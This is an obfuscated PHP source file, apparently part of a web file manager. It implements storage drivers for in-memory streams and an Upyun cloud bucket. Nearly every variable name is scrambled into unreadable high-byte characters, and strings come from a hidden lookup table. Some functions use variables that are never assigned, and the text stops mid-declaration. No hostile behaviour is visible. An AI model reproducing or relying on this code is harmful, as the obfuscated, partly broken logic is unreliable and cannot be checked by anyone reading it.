<?php
 goto a·º—§†æ¦; e£¬¿œê: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‚£®Ç‹™, $ ª‹–Òë = 0) { parent::__construct(); $this->source = $‚£®Ç‹™; $this->sourceSize = $ ª‹–Òë; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($şùş­¨Ú = false) { return $this->sourceSize; } public function getContent($ëù®ã¬ = false) { return $this->fileSubstr($ëù®ã¬, 0, $this->sourceSize); } public function fileSubstr($Š³¹Õ´æ = false, $ ëÊ•ø = 0, $ßÌ‡”„ª = 0) { if (!$ßÌ‡”„ª) { $ßÌ‡”„ª = $this->sourceSize; } $ÙºğŒîô = $this->sourceSize - $ ëÊ•ø; if ($ßÌ‡”„ª >= $ÙºğŒîô) { $ßÌ‡”„ª = $ÙºğŒîô; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ ëÊ•ø, $ßÌ‡”„ª); } if ($this->sourceType == self::TYPE_FILE) { if ($ßÌ‡”„ª <= 0) { return $_SERVER[ßğøİ][12]; } $öÌèÂ¦Û = ftell($this->source); fseek_64($this->source, $öÌèÂ¦Û + $ ëÊ•ø); $Š÷“¦  = @fread($this->source, $ßÌ‡”„ª); fseek_64($this->source, $öÌèÂ¦Û); return $Š÷“¦ ; } } public function hashMd5($™ê´ù« = false) { return md5($this->getContent()); } public static function hash($©èªÜµ, $˜¿ìšÊ½ = 0) { $¢ĞŒı¹¯ = new PathDriverStream($©èªÜµ, $˜¿ìšÊ½); return $¢ĞŒı¹¯->hashSimple($©èªÜµ); } public static function md5($‘ôè¸Èö, $ÈõÊ­¸Û = 0) { $Œ«×éÀá = new PathDriverStream($‘ôè¸Èö, $ÈõÊ­¸Û); return $Œ«×éÀá->hashMd5($‘ôè¸Èö); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\x74\164\x70\x3a\x2f\57\x76\60\56\x61\160\151\56\x75\x70\171\165\x6e\x2e\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ «Ëß´Š) { parent::__construct(); $this->_init($ «Ëß´Š); } public function _init($ëˆĞÅ†ø) { $‹ºÍ™ƒñ =& $_SERVER[ßğøİ]; foreach ($ëˆĞÅ†ø as $äî±€Ñ => $ıë®‚¦©) { if (isset($this->{$äî±€Ñ})) { $this->{$äî±€Ñ} = $ıë®‚¦©; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‹ºÍ™ƒñ[1453] . LNG($‹ºÍ™ƒñ[1384])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ı²§åæ, $÷§ÃÃá¡ = "\x47\105\124") { $«æäùúó =& $_SERVER[ßğøİ]; $ÉÜ“ÒˆÆ = gmdate($«æäùúó[1417]); $±¯¾õ½œ = base64_encode(hash_hmac($«æäùúó[1454], "{$÷§ÃÃá¡}\46{$ı²§åæ}\x26{$ÉÜ“ÒˆÆ}", md5("{$this->userpass}"), !0)); $……Œ‚Ï = array("\101\x75\x74\x68\157\x72\151\x7a\141\x74\x69\157\156\72\125\120\131\125\116\x20{$this->username}\x3a{$±¯¾õ½œ}", "\104\x61\164\145\72{$ÉÜ“ÒˆÆ}"); return $……Œ‚Ï; } public function ussRequest($ë©‰Ş¸, $óÊÀå½ = "\107\105\x54", $şï‘İ®Ÿ = false, $›ö”ç‹ = false, $˜Õ“Û‘ü = false) { $ˆÆØÂğ“ =& $_SERVER[ßğøİ]; $ë©‰Ş¸ = trim($ë©‰Ş¸, $ˆÆØÂğ“[8]); $ƒ™ùí¾ = "\57{$this->bucket}\57{$ë©‰Ş¸}"; $·¨ù°±¸ = $this->ussHeaders($ƒ™ùí¾, $óÊÀå½); if ($›ö”ç‹) { $·¨ù°±¸ = array_merge($·¨ù°±¸, $›ö”ç‹); } $Ã¸Ûãá¨ = url_request($this->endpoint . $ƒ™ùí¾, $óÊÀå½, $şï‘İ®Ÿ, $·¨ù°±¸, $˜Õ“Û‘ü); if (!$Ã¸Ûãá¨) { return array($ˆÆØÂğ“[1191] => !1, $ˆÆØÂğ“[1193] => $ˆÆØÂğ“[1455]); } if (strtolower($óÊÀå½) == $ˆÆØÂğ“[196] || in_array($Ã¸Ûãá¨[$ˆÆØÂğ“[1191]], array($ˆÆØÂğ“[1310], $ˆÆØÂğ“[1456]))) { $şï‘İ®Ÿ = $Ã¸Ûãá¨[$ˆÆØÂğ“[1457]]; } else { $şï‘İ®Ÿ = json_decode($Ã¸Ûãá¨[$ˆÆØÂğ“[1193]], !0); if (!$şï‘İ®Ÿ) { $şï‘İ®Ÿ = $Ã¸Ûãá¨[$ˆÆØÂğ“[1193]]; } else { if (!$Ã¸Ûãá¨[$ˆÆØÂğ“[747]] && isset($şï‘İ®Ÿ[$ˆÆØÂğ“[1458]])) { $şï‘İ®Ÿ = $şï‘İ®Ÿ[$ˆÆØÂğ“[1458]]; } } } return array($ˆÆØÂğ“[1191] => $Ã¸Ûãá¨[$ˆÆØÂğ“[747]], $ˆÆØÂğ“[1193] => $şï‘İ®Ÿ); } public function mkfile($€Ö‡È‚Ü, $¦ÚéÙ˜ = '', $¯äç™ïØ = REPEAT_RENAME) { if ($this->setContent($€Ö‡È‚Ü, $¦ÚéÙ˜)) { return $this->getPathOuter($€Ö‡È‚Ü); } return !1; } public function mkdir($¤¯Ğ¶øé, $…ª…èİÇ = REPEAT_SKIP) { $»ÖŒÒ =& $_SERVER[ßğøİ]; $‰ŸÇë½² = trim($¤¯Ğ¶øé, $»ÖŒÒ[8]); if ($this->_isFolder($‰ŸÇë½²)) { return $this->getPathOuter($‰ŸÇë½²); } $£—«•ıÕ = array($»ÖŒÒ[1459]); $§Òñäƒ = $this->ussRequest($‰ŸÇë½², $»ÖŒÒ[226], !1, $£—«•ıÕ); return $§Òñäƒ[$»ÖŒÒ[1191]] ? $this->getPathOuter($‰ŸÇë½²) : !1; } public function copyFile($­ºÎ£»Æ, $ÎüŞè) { $ü‹ÜãÅŞ =& $_SERVER[ßğøİ]; $¸ŞíãÔ› = array($ü‹ÜãÅŞ[1460] . "\x2f{$this->bucket}\57{$­ºÎ£»Æ}", $ü‹ÜãÅŞ[1461]); $Ø«í´ı = $this->ussRequest($ÎüŞè, $ü‹ÜãÅŞ[228], !1, $¸ŞíãÔ›); return $Ø«í´ı[$ü‹ÜãÅŞ[1191]] ? !0 : $this->getPathOuter($ÎüŞè); } public function moveFile($¤™É¾Ğ›, $ù£àåø) { $ŸùËğ´Ù =& $_SERVER[ßğøİ]; $¿œÁˆôË = array($ŸùËğ´Ù[1462] . "\57{$this->bucket}\57{$¤™É¾Ğ›}", $ŸùËğ´Ù[1461]); $ÜÁèû… = $this->ussRequest($ù£àåø, $ŸùËğ´Ù[228], !1, $¿œÁˆôË); return $ÜÁèû…[$ŸùËğ´Ù[1191]] ? !0 : $this->getPathOuter($ù£àåø); } public function delFile($ˆïµ¾á) { $—µè¦ÌÂ =& $_SERVER[ßğøİ]; $şçƒùÃñ = $this->ussRequest($ˆïµ¾á, $—µè¦ÌÂ[1463]); return $şçƒùÃñ[$—µè¦ÌÂ[1191]] ? !0 : !1; } public function delFolder($‰Çû¸ë®) { $ºÑ˜ÛÆÏ =& $_SERVER[ßğøİ]; if (!$this->exist($‰Çû¸ë®)) { return !0; } $this->listItemCache = !1; $øĞçõ¨ = $ÖÅÊ‚óî = array(); $this->fileList($‰Çû¸ë®, $øĞçõ¨, $ÖÅÊ‚óî, !0); $this->listItemCache = !0; foreach ($ÖÅÊ‚óî as $²»îæ¯À) { $™šîŠğ§ = $this->ussRequest($²»îæ¯À[$ºÑ˜ÛÆÏ[32]], $ºÑ˜ÛÆÏ[1463]); if (!$™šîŠğ§[$ºÑ˜ÛÆÏ[1191]]) { return !1; } } foreach ($øĞçõ¨ as $£ŠÁ­Åö) { $™šîŠğ§ = $this->ussRequest($£ŠÁ­Åö, $ºÑ˜ÛÆÏ[1463]); if (!$™šîŠğ§[$ºÑ˜ÛÆÏ[1191]]) { return !1; } } $™šîŠğ§ = $this->ussRequest($‰Çû¸ë®, $ºÑ˜ÛÆÏ[1463]); return $™šîŠğ§[$ºÑ˜ÛÆÏ[1191]]; } public function rename($“Ùº›àò, $«æšù–Š) { if ($this->isFile($“Ùº›àò)) { $«æšù–Š = get_path_father($“Ùº›àò) . $«æšù–Š; return $this->moveFile($“Ùº›àò, $«æšù–Š); } return $this->renameObject($“Ùº›àò, $«æšù–Š); } public function fileInfo($¨ü´Ö¥Œ, $õ÷‹¶¹ = false, $ô¡œ®ŸÎ = array()) { $ÅğËãüÙ =& $_SERVER[ßğøİ]; $û‘ø¯¦¯ = array($ÅğËãüÙ[32] => $this->pathThis($¨ü´Ö¥Œ), $ÅğËãüÙ[84] => $this->getPathOuter($ÅğËãüÙ[8] . $¨ü´Ö¥Œ), $ÅğËãüÙ[33] => $ÅğËãüÙ[199], $ÅğËãüÙ[76] => isset($ô¡œ®ŸÎ[$ÅğËãüÙ[76]]) ? $ô¡œ®ŸÎ[$ÅğËãüÙ[76]] : 0, $ÅğËãüÙ[174] => $this->ext($¨ü´Ö¥Œ)); if ($õ÷‹¶¹) { return $û‘ø¯¦¯; } $û‘ø¯¦¯[$ÅğËãüÙ[200]] = $û‘ø¯¦¯[$ÅğËãüÙ[85]] = 0; $û‘ø¯¦¯[$ÅğËãüÙ[201]] = $û‘ø¯¦¯[$ÅğËãüÙ[202]] = !0; if (empty($ô¡œ®ŸÎ)) { $ô¡œ®ŸÎ = $this->objectMeta($¨ü´Ö¥Œ); if (!$ô¡œ®ŸÎ) { return $û‘ø¯¦¯; } } $û‘ø¯¦¯[$ÅğËãüÙ[200]] = intval($ô¡œ®ŸÎ[$ÅğËãüÙ[1464]]); $û‘ø¯¦¯[$ÅğËãüÙ[85]] = intval($ô¡œ®ŸÎ[$ÅğËãüÙ[1465]]); $û‘ø¯¦¯[$ÅğËãüÙ[76]] = $ô¡œ®ŸÎ[$ÅğËãüÙ[76]]; return $û‘ø¯¦¯; } public function folderInfo($¢ĞË‹Ã¼, $±‚â™® = false) { $ÔÄãò¾ş =& $_SERVER[ßğøİ]; $Õ¯±å = array($ÔÄãò¾ş[32] => $this->pathThis($¢ĞË‹Ã¼), $ÔÄãò¾ş[84] => $this->getPathOuter($ÔÄãò¾ş[8] . $¢ĞË‹Ã¼), $ÔÄãò¾ş[33] => $ÔÄãò¾ş[75]); if ($±‚â™®) { return $Õ¯±å; } $Õ¯±å[$ÔÄãò¾ş[200]] = $Õ¯±å[$ÔÄãò¾ş[85]] = 0; $Õ¯±å[$ÔÄãò¾ş[201]] = $Õ¯±å[$ÔÄãò¾ş[202]] = !0; if (empty($œ³û‰Ã±)) { $œ³û‰Ã± = $this->objectMeta($¢ĞË‹Ã¼); if (!$œ³û‰Ã±) { return $Õ¯±å; } } $Õ¯±å[$ÔÄãò¾ş[200]] = intval($œ³û‰Ã±[$ÔÄãò¾ş[1464]]); $Õ¯±å[$ÔÄãò¾ş[85]] = intval($œ³û‰Ã±[$ÔÄãò¾ş[1465]]); return $Õ¯±å; } private function listObjs($ğîÌÌ¾ı, $ĞÆ»ÈÌÍ = 0, $¿ÜƒÄ‰Œ = 1000) { $šÃÓ¢ñı =& $_SERVER[ßğøİ]; $Ğ¸¿İö = array($šÃÓ¢ñı[1466], $šÃÓ¢ñı[1467] . $¿ÜƒÄ‰Œ); if ($ĞÆ»ÈÌÍ) { $Ğ¸¿İö[] = $šÃÓ¢ñı[1468] . $ĞÆ»ÈÌÍ; } $® Û»é— = $this->ussRequest($ğîÌÌ¾ı, $šÃÓ¢ñı[230], !1, $Ğ¸¿İö); return !$® Û»é—[$šÃÓ¢ñı[1191]] ? !1 : $® Û»é—[$šÃÓ¢ñı[1193]]; } private function fileList($óÁçüÊ, &$ÑŠñ‹«, &$ë²Ü½šÙ, $±¼Ø˜ªÀ = false) { $êÙÄ™‹‘ =& $_SERVER[ßğøİ]; $ä¦ƒüü‘ = $êÙÄ™‹‘[12]; $ë³×°÷Á = 1000; $öÅó¿»Ÿ = rtrim($óÁçüÊ, $êÙÄ™‹‘[8]) . $êÙÄ™‹‘[8]; while (!0) { check_abort(); $–ÕÏŒÊ = $this->listObjs($óÁçüÊ, $ä¦ƒüü‘, $ë³×°÷Á); if (!$–ÕÏŒÊ) { return !1; } $ä¦ƒüü‘ = isset($–ÕÏŒÊ[$êÙÄ™‹‘[1469]]) ? $–ÕÏŒÊ[$êÙÄ™‹‘[1469]] : $êÙÄ™‹‘[12]; $©Şõû½ = isset($–ÕÏŒÊ[$êÙÄ™‹‘[1470]]) ? $–ÕÏŒÊ[$êÙÄ™‹‘[1470]] : array(); foreach ($©Şõû½ as $ÏÖà±) { $½Õ­ê‚â = $ÏÖà±[$êÙÄ™‹‘[33]] == $êÙÄ™‹‘[75] ? !0 : !1; $ÚÙ–ä©Í = ltrim($öÅó¿»Ÿ . $ÏÖà±[$êÙÄ™‹‘[32]], $êÙÄ™‹‘[8]) . ($½Õ­ê‚â ? $êÙÄ™‹‘[8] : $êÙÄ™‹‘[12]); $´ı©¬œ¢ = array($êÙÄ™‹‘[32] => $ÚÙ–ä©Í, $êÙÄ™‹‘[33] => $½Õ­ê‚â ? $êÙÄ™‹‘[75] : $êÙÄ™‹‘[199], $êÙÄ™‹‘[76] => $ÏÖà±[$êÙÄ™‹‘[337]], $êÙÄ™‹‘[1465] => $ÏÖà±[$êÙÄ™‹‘[1471]]); $this->cacheMethodInfoSet($ÚÙ–ä©Í, $½Õ­ê‚â, $´ı©¬œ¢); if ($½Õ­ê‚â) { $ÑŠñ‹«[] = $ÚÙ–ä©Í; if ($±¼Ø˜ªÀ) { $this->fileList($ÚÙ–ä©Í, $ÑŠñ‹«, $ë²Ü½šÙ, $±¼Ø˜ªÀ); } continue; } $ë²Ü½šÙ[] = $´ı©¬œ¢; } if (count($©Şõû½) < $ë³×°÷Á) { break; } } $this->cacheMethodInfoSet($óÁçüÊ, !0); } public function listPath($šÆù”â÷, $Ò›ÅÅ·” = false) { $´Ÿ˜…İ¿ =& $_SERVER[ßğøİ]; $Ô¤Ô“ôš = $«ÍŒ¿€ = array(); $this->fileList($šÆù”â÷, $Ô¤Ô“ôš, $«ÍŒ¿€); foreach ($Ô¤Ô“ôš as $Î”úŒîâ => $óøóëş») { $Ô¤Ô“ôš[$Î”úŒîâ] = $this->folderInfo($óøóëş», $Ò›ÅÅ·”); } foreach ($«ÍŒ¿€ as $Î”úŒîâ => $óøóëş») { $«ÍŒ¿€[$Î”úŒîâ] = $this->fileInfo($óøóëş»[$´Ÿ˜…İ¿[32]], $Ò›ÅÅ·”, $óøóëş»); } return array($´Ÿ˜…İ¿[82] => $Ô¤Ô“ôš, $´Ÿ˜…İ¿[83] => $«ÍŒ¿€); } public function has($½ü€†ÈÓ, $Ñ‚ßÖ¥À = false, $Îş³†² = true) { $İíØê¬ =& $_SERVER[ßğøİ]; $¨¹¨”£´ = $İíØê¬[12]; $ÊÇòíÏ¶ = 500; $›„­‰ˆ± = 0; $ÅŒ‹Ê°ö = 0; $—Ç¥µ¹ = rtrim($½ü€†ÈÓ, $İíØê¬[8]) . $İíØê¬[8]; while (!0) { check_abort(); $³›ÓœÏà = $this->listObjs($½ü€†ÈÓ, $¨¹¨”£´, $ÊÇòíÏ¶); if (!$³›ÓœÏà) { return !1; } $¨¹¨”£´ = isset($³›ÓœÏà[$İíØê¬[1469]]) ? $³›ÓœÏà[$İíØê¬[1469]] : $İíØê¬[12]; $ÎªŸ¤Ë = isset($³›ÓœÏà[$İíØê¬[1470]]) ? $³›ÓœÏà[$İíØê¬[1470]] : array(); if (empty($ÎªŸ¤Ë)) { break; } $êêİ²äú = array_filter($ÎªŸ¤Ë, function ($³Ûñ¾ŸÑ) { $¿á©ïÇ¬ =& $_SERVER[ßğøİ]; return $³Ûñ¾ŸÑ[$¿á©ïÇ¬[33]] == $¿á©ïÇ¬[75]; }); $€É’Ï™¹ = count($ÎªŸ¤Ë); $êêİ²äú = count($êêİ²äú); $•Ğ®³Ò• = $€É’Ï™¹ - $êêİ²äú; if ($Ñ‚ßÖ¥À) { $ÅŒ‹Ê°ö += $êêİ²äú; $›„­‰ˆ± += $•Ğ®³Ò•; if ($€É’Ï™¹ < $ÊÇòíÏ¶) { break; } continue; } if ($Îş³†²) { if ($•Ğ®³Ò•) { return !0; } } else { if ($êêİ²äú) { return !0; } } if ($€É’Ï™¹ < $ÊÇòíÏ¶) { break; } } if ($Ñ‚ßÖ¥À) { return array($İíØê¬[207] => $›„­‰ˆ±, $İíØê¬[208] => $ÅŒ‹Ê°ö); } return !1; } public function listAll($óéÌ¦é ) { $”¸¶×ò˜ =& $_SERVER[ßğøİ]; $ÖûÏˆÆ‡ = $ˆ¿œ®½ = array(); $this->fileList($óéÌ¦é , $ÖûÏˆÆ‡, $ˆ¿œ®½, !0); $æ»ş•ó´ = array(); foreach ($ˆ¿œ®½ as $°µÚÒéÂ) { $æ»ş•ó´[$°µÚÒéÂ[$”¸¶×ò˜[32]]] = $°µÚÒéÂ[$”¸¶×ò˜[76]]; } foreach ($ÖûÏˆÆ‡ as $°µÚÒéÂ) { if (is_string($°µÚÒéÂ)) { $æ»ş•ó´[$°µÚÒéÂ] = 0; } } return $this->listAllFiles($óéÌ¦é , array_keys($æ»ş•ó´), $æ»ş•ó´); } public function canRead($‰ç‚€) { return $this->exist($‰ç‚€) ? !0 : !1; } public function canWrite($×Ü±´­) { return $this->exist($×Ü±´­) ? !0 : !1; } public function getContent($ÃÌæäğ˜) { return $this->fileSubstr($ÃÌæäğ˜, 0, -1); } public function setContent($Í‹ºÜ, $ÓÒÔ‘ñ = '') { $ÚÑÜğÌ =& $_SERVER[ßğøİ]; if (!$ÓÒÔ‘ñ) { $œ‹»¶ = $this->ussRequest($Í‹ºÜ, $ÚÑÜğÌ[226]); return $œ‹»¶[$ÚÑÜğÌ[1191]]; } $¯Î…®¤Ì = $this->tempFile($this->pathThis($Í‹ºÜ)); file_put_contents($¯Î…®¤Ì, $ÓÒÔ‘ñ); if ($this->upload($Í‹ºÜ, $¯Î…®¤Ì)) { $this->tempFileRemve($¯Î…®¤Ì); return !0; } return !1; } public function fileSubstr($£Š£øş, $Î¬ñº¼¡, $Í°šÑÙ) { $ÎÁ÷Ãéï =& $_SERVER[ßğøİ]; if (!($—Œ›¶ì = $this->link($£Š£øş))) { return !1; } $ùÁ¯¢ƒí = !1; if ($Í°šÑÙ > 0) { $˜Éö£ÙÑ = $Î¬ñº¼¡ + $Í°šÑÙ - 1; $ùÁ¯¢ƒí = array($ÎÁ÷Ãéï[1432] . $Î¬ñº¼¡ . $ÎÁ÷Ãéï[386] . $˜Éö£ÙÑ); } $îÂßñ˜ò = url_request($—Œ›¶ì, $ÎÁ÷Ãéï[230], !1, $ùÁ¯¢ƒí); return $îÂßñ˜ò[$ÎÁ÷Ãéï[747]] ? $îÂßñ˜ò[$ÎÁ÷Ãéï[1193]] : !1; } public function upload($Ü¥éÔ‰¤, $ùûè„ÃĞ, $‘ìœÆÉÔ = false, $ÎÔé·Œä = REPEAT_REPLACE) { $Ò»İ÷ë­ =& $_SERVER[ßğøİ]; $’ëâßˆ = IO::size($ùûè„ÃĞ); if ($’ëâßˆ <= 1024 * 1024 * 200) { $º¤©¿…Ü = array($Ò»İ÷ë­[1472] . $ùûè„ÃĞ); $İ‚ï×™ = $this->ussRequest($Ü¥éÔ‰¤, $Ò»İ÷ë­[228], $º¤©¿…Ü); return $İ‚ï×™[$Ò»İ÷ë­[1191]] ? $this->getPathOuter($Ü¥éÔ‰¤) : !1; } $«Îˆƒ¾Ç = 1024 * 1024 * 10; $‰´íÒşé = array($Ò»İ÷ë­[1473], $Ò»İ÷ë­[1474] . $’ëâßˆ, $Ò»İ÷ë­[1475], $Ò»İ÷ë­[1476] . $«Îˆƒ¾Ç); $İ‚ï×™ = $this->ussRequest($Ü¥éÔ‰¤, $Ò»İ÷ë­[228], !1, $‰´íÒşé); if (!$İ‚ï×™[$Ò»İ÷ë­[1191]]) { return !1; } $ÏŞ×äùÓ = $İ‚ï×™[$Ò»İ÷ë­[1193]]; $ƒÙ¦½áƒ = 0; $ Éç–°ï = $ÏŞ×äùÓ[$Ò»İ÷ë­[1477]]; $¤¥ÊªÁì = fopen($ùûè„ÃĞ, $Ò»İ÷ë­[1381]); if (!$¤¥ÊªÁì) { return !1; } do { $ ô®³­ô = $ÏŞ×äùÓ[$Ò»İ÷ë­[1478]]; fseek_64($¤¥ÊªÁì, $ƒÙ¦½áƒ); $ÒÑ‹ªÖÏ = fread($¤¥ÊªÁì, $ ô®³­ô); $Îä½¬¶ = 0; do { $Îä½¬¶++; $ÏŞ×äùÓ = $this->uploadPart($Ü¥éÔ‰¤, $ÏŞ×äùÓ, $ÒÑ‹ªÖÏ); } while (!$ÏŞ×äùÓ && $Îä½¬¶ < 3); if (!$ÏŞ×äùÓ) { return !1; } $ Éç–°ï = $ÏŞ×äùÓ[$Ò»İ÷ë­[1477]]; $ƒÙ¦½áƒ += $ ô®³­ô; } while ($ Éç–°ï != -1); fclose($¤¥ÊªÁì); $‰´íÒşé = array($Ò»İ÷ë­[1479], $Ò»İ÷ë­[1480] . $ÏŞ×äùÓ[$Ò»İ÷ë­[1481]], $Ò»İ÷ë­[1475]); $İ‚ï×™ = $this->ussRequest($Ü¥éÔ‰¤, $Ò»İ÷ë­[228], !1, $‰´íÒşé); return $İ‚ï×™[$Ò»İ÷ë­[1191]] ? $this->getPathOuter($Œë¾ÙÒ) : !1; } private function uploadPart($êĞÕé“, $üÕöÅö¨, &$ìô²áÒ¿) { $¹Ã‘°êõ =& $_SERVER[ßğøİ]; $ÏÀ°˜¯‰ = array($¹Ã‘°êõ[1482], $¹Ã‘°êõ[1480] . $üÕöÅö¨[$¹Ã‘°êõ[1481]], $¹Ã‘°êõ[1483] . $üÕöÅö¨[$¹Ã‘°êõ[1477]], $¹Ã‘°êõ[142] . $üÕöÅö¨[$¹Ã‘°êõ[1478]]); $¯ÕĞ‰¥ = $this->ussRequest($êĞÕé“, $¹Ã‘°êõ[228], $ìô²áÒ¿, $ÏÀ°˜¯‰); return !$¯ÕĞ‰¥[$¹Ã‘°êõ[1191]] ? $¯ÕĞ‰¥[$¹Ã‘°êõ[1191]] : $¯ÕĞ‰¥[$¹Ã‘°êõ[1193]]; } public function uploadFormData($Å·»èÎç, $ØàäÚë— = 3600) { return $this->uploadPolicy($Å·»èÎç, $ØàäÚë—); } public function multiUploadFormData($Ş×¾Ø¸«, $¥ğÏ«¶õ = 3600) { $ƒ€Åõó =& $_SERVER[ßğøİ]; $‡æĞĞú = (int) $GLOBALS[$ƒ€Åõó[7]][$ƒ€Åõó[76]]; return $this->uploadPolicy($Ş×¾Ø¸«, $¥ğÏ«¶õ, $‡æĞĞú); } private function uploadPolicy($×©Ğ²‡†, $úãÈúú¥ = 3600, $ó–©ğ’Ÿ = 0) { $²Ä´Í© =& $_SERVER[ßğøİ]; $›˜Â£»Í = $²Ä´Í©[8] . $this->bucket; $ï‹¬ÌÅ² = gmdate($²Ä´Í©[1417]); $ŞØˆÈŸ = array($²Ä´Í©[1484] => $this->bucket, $²Ä´Í©[1485] => $×©Ğ²‡†, $²Ä´Í©[1486] => time() + $úãÈúú¥, $²Ä´Í©[1487] => $ï‹¬ÌÅ²); if ($ó–©ğ’Ÿ) { $ŞØˆÈŸ[$²Ä´Í©[1397]] = $ó–©ğ’Ÿ; } $»¶Áä¶ö = base64_encode(json_encode($ŞØˆÈŸ)); $ö£¾òØÎ = base64_encode(hash_hmac($²Ä´Í©[1454], "\x50\117\123\124\46{$›˜Â£»Í}\46{$ï‹¬ÌÅ²}\46{$»¶Áä¶ö}", md5("{$this->userpass}"), !0)); $˜Ä®²û— = array($²Ä´Í©[1322] => $»¶Áä¶ö, $²Ä´Í©[1488] => "\125\x50\x59\125\116\x20{$this->username}\72{$ö£¾òØÎ}", $²Ä´Í©[181] => $this->endpoint . $›˜Â£»Í); return $˜Ä®²û—; } public function download($‚ì¥›çÒ, $Ú’ÁØóü) { $¥í¨º¦ù = IO::getPathInner(IO::mkfile($Ú’ÁØóü)); if (!($î²Ù ®Ã = $this->link($‚ì¥›çÒ))) { return !1; } $òø™›Ã = 0; $ÍÓ„äº® = 1024 * 200; $ø£»†šô = fopen($¥í¨º¦ù, $_SERVER[ßğøİ][1438]); while (!0) { $›ÛûµÅĞ = $this->fileSubstr($‚ì¥›çÒ, $òø™›Ã, $ÍÓ„äº®); if ($›ÛûµÅĞ === !1) { return !1; } fwrite($ø£»†šô, $›ÛûµÅĞ); $òø™›Ã += $ÍÓ„äº®; if (strlen($›ÛûµÅĞ) < $ÍÓ„äº®) { break; } } fclose($ø£»†šô); return $Ú’ÁØóü; } public function link($Ìéé±“¸, $Ö¤ŠéÇ¶ = array()) { $ÛÄ†„Èª =& $_SERVER[ßğøİ]; $Ìéé±“¸ = trim($Ìéé±“¸, $ÛÄ†„Èª[8]); if (!empty($this->token)) { $îòåºª÷ = strtotime(date($ÛÄ†„Èª[1489])); $¡ÎµÈÂ½ = substr(md5($this->token . $ÛÄ†„Èª[284] . $îòåºª÷ . $ÛÄ†„Èª[1490] . $Ìéé±“¸), 12, 8) . $îòåºª÷; $Ö¤ŠéÇ¶[] = $ÛÄ†„Èª[1491] . $¡ÎµÈÂ½; } $š¯º…ò± = !empty($Ö¤ŠéÇ¶) ? $ÛÄ†„Èª[73] . implode($ÛÄ†„Èª[284], $Ö¤ŠéÇ¶) : $ÛÄ†„Èª[12]; return $this->getHost() . $ÛÄ†„Èª[8] . $Ìéé±“¸ . $š¯º…ò±; } public function fileOut($†“ƒªÉ, $¥‹Ï…—œ = false, $îè­®Øï = false, $—ÜĞê¶ê = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($†“ƒªÉ, $¥‹Ï…—œ, $îè­®Øï, $—ÜĞê¶ê); } if (!$îè­®Øï) { $îè­®Øï = $this->pathThis($†“ƒªÉ); } $µŸ¦ÑµÊ = $¥‹Ï…—œ ? array($_SERVER[ßğøİ][1492] . rawurlencode($îè­®Øï)) : array(); $¨½×¨„Û = $this->link($†“ƒªÉ, $µŸ¦ÑµÊ); $this->fileOutLink($¨½×¨„Û); } public function fileOutServer($éõ€À¿Û, $í ÅÊ»ı = false, $ºÌã×‚ = false, $œã°Áì = '') { parent::fileOut($éõ€À¿Û, $í ÅÊ»ı, $ºÌã×‚, $œã°Áì); } public function fileOutImage($Ş—¦¹©³, $¸°™×œò = 250) { $Ê´³ğıÆ = $this->link($Ş—¦¹©³ . $_SERVER[ßğøİ][1493] . $¸°™×œò); $this->fileOutLink($Ê´³ğıÆ); } public function fileOutImageServer($Õ±éÙ, $Œˆïı–˜ = 250) { parent::fileOutImage($Õ±éÙ, $Œˆïı–˜); } public function hashMd5($½øŞ±ô‡) { $ìÀ¨õª› =& $_SERVER[ßğøİ]; $Ñö‘¿ş÷ = $this->_objectMeta($½øŞ±ô‡); return isset($Ñö‘¿ş÷[$ìÀ¨õª›[212]]) ? $Ñö‘¿ş÷[$ìÀ¨õª›[212]] : !1; } public function size($ùÚØÕ¶§) { $¹ëò²Ê˜ = $this->objectMeta($ùÚØÕ¶§); return $¹ëò²Ê˜ ? $¹ëò²Ê˜[$_SERVER[ßğøİ][76]] : 0; } public function info($¹¸Ô‡’º) { if ($this->isFolder($¹¸Ô‡’º)) { return $this->folderInfo($¹¸Ô‡’º); } else { if ($this->isFile($¹¸Ô‡’º)) { return $this->fileInfo($¹¸Ô‡’º); } } return !1; } public function exist($È±Îæˆµ) { return $this->isFile($È±Îæˆµ) || $this->isFolder($È±Îæˆµ); } public function isFile($°±­Òìû) { return !$this->isFolder($°±­Òìû) && $this->objectMeta($°±­Òìû); } public function isFolder($•éØìÚ¯) { return $this->cacheMethod($_SERVER[ßğøİ][165], $•éØìÚ¯); } protected function objectMeta($—§˜øÅ×) { return $this->cacheMethod($_SERVER[ßğøİ][167], $—§˜øÅ×); } protected function _objectMeta($¸Ò¾ï½—) { $ñãİØç™ =& $_SERVER[ßğøİ]; if ($¸Ò¾ï½— == $ñãİØç™[12] || $¸Ò¾ï½— == $ñãİØç™[8]) { return array(); } $Ó­üİ = $this->ussRequest($¸Ò¾ï½—, $ñãİØç™[1494]); if (!$Ó­üİ[$ñãİØç™[1191]]) { return null; } $ÎşÇŒŞ˜ = isset($Ó­üİ[$ñãİØç™[1193]]) ? $Ó­üİ[$ñãİØç™[1193]] : array(); if (!isset($ÎşÇŒŞ˜[$ñãİØç™[1495]])) { return null; } $Œõ¿×µŒ = array($ñãİØç™[33] => isset($ÎşÇŒŞ˜[$ñãİØç™[1495]]) ? $ÎşÇŒŞ˜[$ñãİØç™[1495]] : null, $ñãİØç™[76] => isset($ÎşÇŒŞ˜[$ñãİØç™[1496]]) ? $ÎşÇŒŞ˜[$ñãİØç™[1496]] : null, $ñãİØç™[212] => isset($ÎşÇŒŞ˜[$ñãİØç™[1497]]) ? $ÎşÇŒŞ˜[$ñãİØç™[1497]] : null, $ñãİØç™[1464] => isset($ÎşÇŒŞ˜[$ñãİØç™[1498]]) ? $ÎşÇŒŞ˜[$ñãİØç™[1498]] : null); $Œõ¿×µŒ[$ñãİØç™[1465]] = isset($ÎşÇŒŞ˜[$ñãİØç™[1499]]) ? strtotime($ÎşÇŒŞ˜[$ñãİØç™[1499]]) : $Œõ¿×µŒ[$ñãİØç™[1464]]; return $Œõ¿×µŒ; } protected 